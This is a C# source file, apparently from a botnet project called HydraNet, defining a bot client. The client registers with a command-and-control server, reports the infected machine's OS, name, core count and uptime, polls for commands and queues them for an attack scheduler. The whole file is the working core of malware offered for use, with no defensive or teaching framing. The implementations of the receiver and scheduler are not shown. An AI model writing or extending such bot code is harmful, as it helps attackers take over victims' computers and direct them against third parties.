namespace HydraNet.Core;

using HydraNet.Config;
using HydraNet.Models;

public sealed class BotClient
{
    private readonly BotConfig _config;
    private readonly CommandReceiver _receiver;
    private readonly AttackScheduler _scheduler;
    private CancellationTokenSource _cts;
    private bool _running;

    public string BotId { get; }
    public bool IsConnected => _running;

    public BotClient(BotConfig config)
    {
        _config = config;
        BotId = Guid.NewGuid().ToString("N")[..12];
        _receiver = new CommandReceiver(config.C2Url, BotId);
        _scheduler = new AttackScheduler();
        _cts = new CancellationTokenSource();
    }

    public async Task ConnectAsync()
    {
        _running = true;
        await _receiver.RegisterAsync(GetSystemInfo());

        while (!_cts.Token.IsCancellationRequested)
        {
            var command = await _receiver.PollAsync(_cts.Token);
            if (command is not null)
            {
                _scheduler.Enqueue(command);
            }
            await Task.Delay(_config.PollInterval, _cts.Token);
        }
    }

    public void Shutdown()
    {
        _running = false;
        _cts.Cancel();
        _scheduler.CancelAll();
    }

    private Dictionary<string, string> GetSystemInfo()
    {
        return new Dictionary<string, string>
        {
            ["bot_id"] = BotId,
            ["os"] = Environment.OSVersion.ToString(),
            ["machine"] = Environment.MachineName,
            ["cores"] = Environment.ProcessorCount.ToString(),
            ["uptime"] = Environment.TickCount64.ToString()
        };
    }
}
